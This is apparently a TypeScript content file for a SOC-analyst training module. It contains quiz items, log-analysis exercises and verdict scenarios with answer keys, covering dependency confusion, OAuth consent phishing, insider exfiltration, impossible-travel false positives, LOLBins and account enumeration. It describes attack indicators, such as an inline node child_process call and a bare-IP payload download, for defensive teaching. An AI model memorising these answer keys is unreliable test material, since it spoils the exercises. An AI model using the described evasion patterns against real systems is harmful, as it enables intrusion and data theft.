        "Once a user accepts an OAuth consent request, the identity provider issues a signed access/refresh token directly to the requesting application. That token — not a password — is what the attacker's app uses for every subsequent Microsoft Graph or Google Workspace API call. Because no further interactive login occurs, there is no event for MFA to intercept. This is what makes illicit consent grants so dangerous: they sidestep password- and MFA-based defenses entirely, and the only defensible checkpoint is the consent event itself.",
      xp: 25,
    },

    // ── Question 3 ────────────────────────────────────────────────────────
    {
      type: "question" as const,
      id: "edge-q3",
      question:
        "A password-reset endpoint returns HTTP 200 for every request regardless of whether the submitted email exists, and no single request is malformed. What makes this endpoint exploitable for account enumeration, and what is the correct detection layer to catch it?",
      options: [
        "It cannot be exploited if every response is HTTP 200 with identical status codes — enumeration requires an explicit error message difference",
        "The endpoint leaks information through a side channel (response-time variance between the 'user exists' and 'user does not exist' code paths); catching it requires application/business-logic-layer monitoring of response timing and request velocity per source, not network signature detection",
        "This can only be detected by a WAF rule blocking POST requests to any endpoint containing the word 'password'",
        "It is not actually exploitable — response time variance is not considered a security-relevant signal in any real attack",
      ],
      answer: 1,
      explanation:
        "Business-logic attacks like account enumeration exploit legitimate application behavior rather than a code flaw a WAF signature would catch. Here, the side channel is response-time variance: a real lookup-and-send-email path takes measurably longer than an early-return 'no such user' path. Detecting this requires monitoring at the business-transaction layer — velocity of distinct emails submitted per source IP, and timing variance across responses — because every individual HTTP request is syntactically and semantically valid.",
      xp: 25,
    },

    // ── Log Analysis 1: dependency-confusion process chain ─────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la1",
      heading: "CrowdStrike Falcon: A Postinstall Script That Isn't What It Claims to Be",
      context:
        "A developer, d.wong, ran 'npm install internal-logging-utils' on their laptop while pulling in a new dependency for an internal tool. CrowdStrike Falcon generated a medium-confidence detection a few seconds later. At first glance this looks like routine developer tooling noise — npm spawning node.exe happens constantly across your fleet. Look carefully at every field before deciding whether this is routine.",
      event: supplyChainEvent,
      questions: [
        {
          question:
            "The crowdstrike.event.CommandLine shows 'node -e' followed by an inline require('child_process').exec(...) call. Why is this specific pattern unusual for a package's postinstall script, even though node.exe spawning from npm is completely normal?",
          options: [
            "It isn't unusual at all — postinstall scripts commonly use inline node -e evaluation for legitimate build steps",
            "Inline -e evaluation combined with an immediate child_process.exec call to spawn PowerShell is a pattern built for one purpose: executing an arbitrary downloaded payload, not performing a build task. Legitimate postinstall scripts are almost always separate .js files (like scripts/setup.js) that npm invokes, not raw inline code passed on the command line",
            "It is unusual only because PowerShell is involved, and PowerShell is never used in legitimate Windows development workflows",
            "It is unusual because node.exe should never be a child of npm.cmd under any circumstances",
          ],
          answer: 1,
          explanation:
            "Legitimate postinstall scripts are declared in package.json and typically point to a committed file (as this package's own npm.scripts.postinstall field shows: 'node ./scripts/setup.js') — not raw code passed inline via -e on the command line. Seeing an inline -e evaluation that immediately shells out to PowerShell is a strong sign the observed process was NOT the package's declared/expected postinstall behavior, but a secondary, injected action.",
          xp: 25,
        },
        {
          question:
            "The raw field npm.registry shows the package was resolved from https://registry.npmjs.org (the PUBLIC registry), but the package name 'internal-logging-utils' strongly implies an internal-only naming convention. What attack does this combination point to?",
          options: [
            "A typosquatting attack, where the attacker registered a name one character different from a popular public package",
            "Dependency confusion — the developer's build tooling resolved a public package with an internal-sounding name instead of the organization's actual private internal package of the same name, because the public registry was checked and won resolution",
            "This is not evidence of any attack — it just means the company chose to publish an internal tool publicly, which is a normal business decision",
            "A DNS hijacking attack that redirected the request for the internal registry to the public one",
          ],
          answer: 1,
          explanation:
            "This is the textbook dependency-confusion signature: a package name that reads like an internal-only artifact ('internal-logging-utils') being resolved from the public npm registry. Attackers deliberately research internal package naming conventions and publish a same-named, higher-versioned malicious package publicly, betting that misconfigured build tooling will prefer or fail over to the public registry over the organization's private one.",
          xp: 25,
        },
        {
          question:
            "The destination in the network field is a raw IP address (185.220.101.47) over plain HTTP, rather than a domain name over HTTPS. Why does this specific detail matter for triage prioritization?",
          options: [
            "It doesn't matter — IP-based HTTP connections are just as common as domain-based HTTPS ones in legitimate developer tooling",
            "Legitimate package infrastructure, CDNs, and update servers almost universally use domain names with valid TLS certificates; a bare IP address over unencrypted HTTP for a second-stage payload download is a strong low-cost indicator of malicious infrastructure and should raise this from a routine detection to a priority investigation",
            "It matters only because the IP is outside the company's registered ASN — the protocol (HTTP vs HTTPS) is not a meaningful signal on its own",
            "This detail is only relevant for network engineers, not for triage severity decisions",
          ],
          answer: 1,
          explanation:
            "Raw IP destinations over plain HTTP are cheap, disposable attacker infrastructure — no domain registration, no certificate management, easy to rotate. Legitimate software supply-chain infrastructure (npm's own CDN, GitHub releases, corporate update servers) is essentially always served over HTTPS from a named domain. A bare-IP, plaintext-HTTP second-stage download is a fast, low-effort, high-confidence signal that should immediately escalate a detection's priority.",
          xp: 20,
        },
      ],
    },

    // ── Log Analysis 2: OAuth consent grant to rogue app ────────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la2",
      heading: "Azure AD: A Consent Grant That Never Touches a Password",
      context:
        "Azure AD Unified Audit Log recorded a routine-looking 'Consent to application' event for r.patel@nexacorp.com. No failed logins preceded it. No malware alert exists anywhere in the EDR console for this user's device. The event severity was auto-classified as medium by default policy. Walk through the raw fields to determine whether this deserves escalation.",
      event: oauthConsentEvent,
      questions: [
        {
          question:
            "The data.office365.ExtendedProperties.Value field lists the requested scopes as 'Mail.Read offline_access User.Read Contacts.Read'. Which single scope in this list is the strongest independent red flag, and why?",
          options: [
            "User.Read, because it grants access to the user's basic profile information which is highly sensitive",
            "offline_access, because it converts what would otherwise be a session-limited grant into a persistent one — the app can silently refresh its access token indefinitely without the user ever logging in again, which very few legitimate lightweight utility apps ('Quick Doc Viewer') genuinely require",
            "Contacts.Read, because reading contacts is always a sign of malicious intent regardless of context",
            "Mail.Read, because any application requesting mail access should be auto-blocked by default in every tenant",
          ],
          answer: 1,
          explanation:
            "offline_access is the scope that matters most for persistence. Without it, an app's access token expires and the app loses access once the user's session ends. With it, the app receives a refresh token that lets it silently mint new access tokens indefinitely, with no further user interaction. A document-viewer utility has essentially no legitimate reason to need indefinite, ongoing mailbox access — this scope combination is the single strongest signal of intent to harvest data long-term rather than perform a one-time legitimate function.",
          xp: 25,
        },
        {
          question:
            "The data.office365.ApplicationDisplayName is 'Quick Doc Viewer' and the GeoLocation fields show the consent occurred from Latvia. On their own, is either of these facts conclusive proof of a malicious app?",
          options: [
            "Yes — any application name containing a generic term like 'Quick' or 'Viewer' is definitionally malicious",
            "Yes — any consent action originating from Latvia should always be auto-blocked regardless of other context",
            "No, neither fact alone is conclusive — generic app names and foreign IP addresses both have legitimate explanations individually. They become meaningful only in combination with other risk factors: the offline_access scope request, the application's registration/verification status, and whether this location is typical for the user",
            "No, because Azure AD consent screens cannot be triggered from outside the tenant's home country under any circumstances",
          ],
          answer: 2,
          explanation:
            "Neither signal is independently damning — plenty of legitimate apps have generic marketing names, and plenty of legitimate travel or VPN usage produces foreign consent locations. The investigative discipline here is combining weak signals: a generic-sounding, likely-unverified third-party app, requesting a persistence-granting scope (offline_access), consented to from a location atypical for this specific user. Together, these three signals cross the threshold from 'routine' to 'investigate immediately' — individually, none of them would justify escalation.",
          xp: 25,
        },
      ],
    },

    // ── Log Analysis 3: low-and-slow exfil trend ────────────────────────────
    {
      type: "log_analysis" as const,
      id: "edge-la3",
      heading: "SharePoint + UEBA: Fourteen Files a Day, Seventeen Days Running",
      context:
        "A single SharePoint FileDownloaded event for m.reyes shows 14 files pulled from the Contracts library. Your DLP policy's bulk-download threshold is 50 files per hour, so no rule fired and the event sits at low severity in the queue. A UEBA layer sitting on top of the same event stream has been quietly building a very different picture. Compare what each layer sees.",
      event: lowAndSlowEvent,
      questions: [
        {
          question:
            "The dlp.rule_triggered field is false and dlp.observed_files_this_hour (14) is far below dlp.threshold_files_per_hour (50). Why is it a mistake to close this alert as benign based on the DLP fields alone?",
          options: [
            "It is not a mistake — if the DLP threshold was not crossed, the activity is by definition not a security concern",
            "DLP thresholds are calibrated to catch bulk, single-session exfiltration; they are structurally blind to sustained, sub-threshold activity repeated over many days, which is exactly the pattern a patient insider uses to stay invisible. The threshold not firing tells you this session wasn't a smash-and-grab — it tells you nothing about the multi-week trend",
            "It is a mistake only because the threshold value of 50 files/hour is set too high and should be lowered to 10",
            "It is a mistake because DLP should have blocked the download entirely regardless of file count",
          ],
          answer: 1,
          explanation:
            "DLP thresholds are a per-session or per-hour circuit breaker designed to stop large, obvious bulk exports. They are not designed to detect — and structurally cannot detect — a pattern spread across many days where each individual session stays comfortably under the line. Closing this as benign based only on 'threshold not crossed' ignores the fact that DLP was never the layer built to catch this pattern in the first place.",
          xp: 25,
        },
        {
          question:
            "The ueba.consecutive_days_elevated field shows 17, and ueba.library_role_relevance is marked LOW for this Finance-department user accessing the Contracts library. What is the correct analyst action given these two fields together?",
          options: [
            "No action needed — SharePoint access within the company is always considered normal regardless of department or duration",
            "Escalate for investigation: 17 consecutive days of elevated (though individually sub-threshold) activity from a library outside this user's normal job function is a textbook low-and-slow insider exfiltration pattern, and should trigger a review of what was downloaded, whether it was forwarded/uploaded externally, and a conversation with the user's manager",
            "Automatically disable the user's account without further investigation, since 17 days is definitive proof of malicious intent",
            "Lower the user's SharePoint permissions silently without notifying anyone, to avoid tipping off a potential insider",
          ],
          answer: 1,
          explanation:
            "Two independent risk factors reinforcing each other — sustained deviation from personal baseline (17 consecutive elevated days) plus low relevance of the accessed resource to the user's actual role (Finance user in the Contracts library) — is exactly the combination that should trigger escalation. The correct next step is investigation, not instant account disablement: confirm what was accessed, check for any subsequent external transfer (personal email, cloud storage, USB), and loop in the user's manager and HR per your insider-threat playbook, since context (a role change, an approved project) could still explain it.",
          xp: 25,
        },
      ],
    },

    // ── Analyst Choice 1: VPN impossible-travel false positive ─────────────
    {
      type: "analyst_choice" as const,
      id: "edge-ac1",
      heading: "Verdict: Compromised Account or VPN Egress False Positive?",
      scenario:
        "Okta fires an impossible-travel alert for k.oconnell: a successful login from Chicago is followed eleven minutes later by a successful login from Dublin, Ireland — a physically impossible trip in that timeframe. The account has valid MFA on both sessions. Before escalating this as a probable account takeover, review the full event, particularly the network and security-context fields.",
      event: impossibleTravelFPEvent,
      correct_verdict: "false_positive",
      explanation:
        "This is a VPN/corporate-egress false positive, not an account takeover. The decisive fields are okta.security_context.is_proxy = true, okta.security_context.as_org identifying 'NordVPN / Global Corporate Egress Pool' (in this case the organization's own registered VPN egress ASN), and network.vpn_gateway_pool explicitly naming 'nexacorp-vpn-emea-dublin-01' — a company-owned VPN gateway. The user connected to the corporate VPN from Chicago, and their traffic legitimately egressed from the nearest regional gateway in Dublin. Both logins carry the same valid MFA-backed identity; there is no credential compromise signal anywhere in the event. The correct action is to close this as a false positive but verify the vpn_gateway_pool value against your organization's known-good VPN infrastructure inventory once, since an attacker could theoretically spoof or ride a similar-looking commercial VPN to hide in this exact blind spot.",
      fp_trap:
        "The alert title says 'impossible travel' and the raw geography genuinely IS impossible for a human traveler — it is tempting to treat the word 'impossible' as inherently high-severity and escalate immediately. But impossible travel detections were built before centralized VPN/SASE egress was common, and they systematically misfire whenever an organization routes remote traffic through geographically distant egress points. Always check is_proxy and the ASN/org name behind the IP before trusting the geography at face value — the raw distance-over-time math is only meaningful if both IPs represent the user's true physical location.",
      xp: 30,
    },

    // ── Analyst Choice 2: OAuth grant that looks benign but is malicious ────
    {
      type: "analyst_choice" as const,
      id: "edge-ac2",
      heading: "Verdict: Routine App Authorization or Illicit Consent Grant?",
      scenario:
        "A second OAuth consent event appears in the queue, structurally identical in format to routine app authorizations your users perform dozens of times a month (connecting Slack, Zoom, or a calendar tool to their Microsoft account). No malware alert exists. No failed logins exist. The user's MFA was satisfied for their normal session before reaching the consent screen. Nothing about the HTTP traffic looks abnormal — every request went to legitimate login.microsoftonline.com endpoints.",
      event: oauthConsentEvent,
      correct_verdict: "true_positive",
      explanation:
        "This should be treated as a true positive requiring immediate remediation, despite the complete absence of malware, phishing infrastructure, or credential compromise indicators. The combination of three factors makes this a confirmed illicit consent grant rather than routine SaaS adoption: the requested scope includes offline_access alongside Mail.Read and Contacts.Read, which grants the application indefinite, silent, ongoing access to the mailbox with no further user interaction ever required; the application ('Quick Doc Viewer') is a generic-sounding, low-utility-value app with no plausible legitimate need for persistent mail and contacts access; and the consent occurred from an IP/geography (Latvia) with no prior association with this user. Remediation requires revoking the application's access in Azure AD (Enterprise Applications), rotating any credentials or data the app may have already accessed, and reviewing the mailbox for signs of data access (Graph API call logs against this app's client ID) during the window it held the token.",
      fp_trap:
        "Because this event uses the exact same Operation name ('Consent to application.') and the exact same schema as the thousands of legitimate, benign SaaS-connection consents your users perform routinely, it is easy to pattern-match it to 'normal noise' and auto-close without reading the scope list. The trap is treating event TYPE as sufficient context — the same event type covers both a user connecting their calendar app and a user handing an attacker persistent mailbox access. You must read the actual requested scopes and app metadata every time, not just recognize the event name.",
      xp: 30,
    },

    // ── Matching ─────────────────────────────────────────────────────────
    {
      type: "matching" as const,
      id: "edge-m1",
      heading: "Match Each Edge-Case Attack to the Field or Signal That Actually Catches It",
      instructions:
        "Each of these attacks is specifically designed to look routine. Match the attack on the left to the single detection tell on the right that most reliably separates it from normal, benign activity.",
      pairs: [
        {
          id: "dep-confusion",
          left: "Dependency confusion (malicious npm/pip package)",
          right: "Package name matches an internal-only naming convention but resolves from the PUBLIC registry, combined with an inline-eval command spawning a network download",
        },
        {
          id: "insider-lowslow",
          left: "Insider low-and-slow data theft",
          right: "Sustained multi-week deviation from the user's personal download baseline, even though no single session crosses a DLP threshold",
        },
        {
          id: "magecart",
          left: "Magecart-style third-party script injection",
          right: "Unexpected new outbound POST destination from a checkout page, visible in Content-Security-Policy violation reports rather than server-side logs",
        },
        {
          id: "oauth-phish",
          left: "OAuth consent-grant phishing",
          right: "The requested scope list includes offline_access from a generic, unverified application — the only event in the entire attack chain",
        },
        {
          id: "impossible-travel",
          left: "Impossible-travel false positive",
          right: "The second login's IP resolves to a known corporate VPN/proxy ASN and is_proxy is true, rather than an unrelated hosting or residential ASN",
        },
        {
          id: "lolbin",
          left: "LOLBin abuse (regsvr32/certutil)",
          right: "An outbound network connection immediately follows the binary's execution, and the target file/script is remote or unsigned rather than a local, version-controlled artifact",
        },
        {
          id: "bizlogic",
          left: "Password-reset / account enumeration",
          right: "Response-time variance between the 'account exists' and 'account does not exist' code paths, observed across many sequential requests from one source",
        },
      ],
      explanation:
        "Every edge case in this room shares the same structural trick: the individual event, viewed in isolation, is indistinguishable from something benign. What separates a true positive from noise is always a specific contextual field or a cross-event pattern — never the event type alone. Train yourself to ask 'what field would look different if this were the malicious version of this exact same event?' before triaging any of these categories.",
      xp: 35,
    },

    // ── Flag ─────────────────────────────────────────────────────────────
    {
      type: "flag" as const,
      id: "edge-f1",
      prompt:
        "Look at the LOLBin regsvr32 event. Compare the change_management.scheduled_window start time to the change_management.actual_time the command actually ran. How many minutes EARLY did the command execute relative to the start of the approved maintenance window? (Enter a number only.)",
      answer: "5",
      hint: "change_management.scheduled_window starts at 2024-11-05T20:00:00Z. change_management.actual_time is 2024-11-05T19:55:03Z. The minutes_early field confirms the answer directly.",
      xp: 25,
    },

    // ── Reading 6: Wrap-up / analyst playbook for edge cases ───────────────
    {
      type: "reading" as const,
      id: "edge-r6",
      heading: "Building an Analyst Instinct for the Cases That Don't Look Like Attacks",
      content:
        "Every scenario in this room was chosen to break a specific, common analyst assumption. Supply-chain and dependency-confusion attacks break the assumption that 'a trusted parent process means trusted behavior.' Low-and-slow insider theft breaks the assumption that 'a threshold not being crossed means nothing to investigate.' Magecart and MSP compromise break the assumption that 'if my own logs are clean, my environment is clean' — the compromise can live entirely in a third party you depend on but do not control. Shadow IT and OAuth consent phishing break the assumption that 'no malware and no credential theft means no incident' — modern cloud attacks increasingly need neither. VPN-driven impossible-travel false positives break the assumption that 'geography math never lies' — infrastructure can make two logins from one honest person look like two different people. LOLBins break the assumption that 'the tool used tells you the intent' — the exact same binary, same command shape, is routine on Tuesday's change ticket and malicious on Wednesday's intrusion. Business-logic abuse breaks the assumption that 'well-formed requests are safe requests' — an attacker doesn't need to break your application if your application's own designed behavior leaks the information they want.\n\n" +
        "The common thread across all seven cases is this: none of them can be reliably resolved by looking at a single event type or a single threshold. Each one requires either cross-referencing a secondary field (scope requested, ASN/proxy status, package registry source), or building a trend across many events (consecutive days of elevated activity, request velocity from one source, response-time variance across a batch), or reasoning about context the log itself does not explicitly encode (was there a change ticket, is this resource relevant to this user's role, is this app's function consistent with the permissions it is asking for).\n\n" +
        "A practical habit to carry forward: whenever you triage an alert that resolves quickly because it 'looks like normal noise,' pause and ask the specific question this room has repeated in every scenario — 'what would the malicious version of this exact same event look like, and which field would be different?' If you cannot answer that question, you have not actually ruled out the edge case; you have only pattern-matched against the common case. That one habit is what separates an analyst who catches these attacks from one who closes the ticket and moves on.",
      codeExample:
        "THE ONE QUESTION THAT CATCHES EVERY CASE IN THIS ROOM\n" +
        "=============================================================\n" +
        "  Before closing ANY alert as routine, ask:\n\n" +
        "  'What would the MALICIOUS version of this exact same event\n" +
        "   look like — and which single field would be different?'\n\n" +
        "  Supply chain:        registry source + inline-eval command line\n" +
        "  Insider low-and-slow: consecutive elevated days, not single session\n" +
        "  Magecart/MSP:         behavioral deviation within a trusted channel\n" +
        "  OAuth consent:        offline_access scope + publisher verification\n" +
        "  Impossible travel:    ASN/is_proxy behind the 'impossible' IP\n" +
        "  LOLBin:                outbound connection + file signing/versioning\n" +
        "  Business logic:        response-time variance + request velocity\n\n" +
        "  If you can't answer it, you haven't ruled out the edge case —\n" +
        "  you've only pattern-matched against the common case.",
    },
  ],
};

export default [edgeCaseRoom];
